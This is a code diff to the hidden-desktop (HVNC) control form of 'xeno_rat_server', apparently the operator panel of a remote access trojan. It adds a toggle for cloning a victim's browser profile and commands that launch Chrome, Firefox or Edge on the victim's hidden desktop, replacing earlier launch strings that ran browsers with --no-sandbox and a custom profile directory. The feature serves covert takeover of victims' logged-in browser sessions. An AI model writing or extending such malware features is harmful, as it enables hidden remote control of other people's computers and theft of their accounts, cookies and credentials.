@@ -19,6 +19,7 @@ namespace xeno_rat_server.Forms
         Node ImageNode;
         string DesktopName = "hidden_desktop";
         bool playing = false;
+        bool is_clonning_browser = false;
         string[] qualitys = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
         CustomPictureBox customPictureBox1;
         public Hvnc(Node _client)
@@ -122,6 +123,39 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(new byte[] { 5 });
             await client.SendAsync(Encoding.UTF8.GetBytes(path));
         }
+
+        private async Task EnableBrowserClone() 
+        {
+            if (!playing || is_clonning_browser) return;
+            await client.SendAsync(new byte[] { 6 });
+            is_clonning_browser = true;
+        }
+        private async Task DisableBrowserClone()
+        {
+            if (!playing || !is_clonning_browser) return;
+            await client.SendAsync(new byte[] { 7 });
+            is_clonning_browser = false;
+        }
+
+        private async Task StartChrome() 
+        {
+            if (!playing) return;
+            await client.SendAsync(new byte[] { 8 });
+        }
+
+        private async Task StartFirefox()
+        {
+            if (!playing) return;
+            await client.SendAsync(new byte[] { 9 });
+        }
+
+        private async Task StartEdge()
+        {
+            if (!playing) return;
+            await client.SendAsync(new byte[] { 10 });
+        }
+
+
         private async Task<Node> CreateImageNode()
         {
             if (ImageNode != null)
@@ -158,6 +192,7 @@ namespace xeno_rat_server.Forms
         private async void button1_Click(object sender, EventArgs e)
         {
             //start
+            checkBox1.Enabled = true;
             await start();
             button1.Enabled = false;
             playing = true;
@@ -166,6 +201,7 @@ namespace xeno_rat_server.Forms
         private async void button2_Click(object sender, EventArgs e)
         {
             //stop
+            checkBox1.Enabled = false;
             await stop();
             button1.Enabled = true;
             playing = false;
@@ -202,17 +238,29 @@ namespace xeno_rat_server.Forms
 
         private async void button5_Click(object sender, EventArgs e)
         {
-            await StartProc("\"" + @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" + "\"" + @" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\AutomationUser");
+            await StartEdge();
+            if (is_clonning_browser) 
+            {
+               new Thread(()=>MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
+            }
         }
 
         private async void button6_Click(object sender, EventArgs e)
         {
-            await StartProc("\"" + @"C:\Program Files\Google\Chrome\Application\chrome.exe" + "\"" + @" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\AutomationUser");
+            await StartChrome();
+            if (is_clonning_browser)
+            {
+                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
+            }
         }
 
         private async void button7_Click(object sender, EventArgs e)
         {
-            await StartProc("\"" + @"C:\Program Files\Mozilla Firefox\firefox.exe" + "\"" + @" -no-remote -profile C:\AutomationUser");
+            await StartFirefox();
+            if (is_clonning_browser)
+            {
+                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
+            }
         }
 
         private async void button8_Click(object sender, EventArgs e)
@@ -228,6 +276,19 @@ namespace xeno_rat_server.Forms
         private void pictureBox1_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private async void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            if (!playing) return;
+            if (checkBox1.Checked)
+            {
+                await EnableBrowserClone();
+            }
+            else 
+            {
+                await DisableBrowserClone();
+            }
         }
     }
 
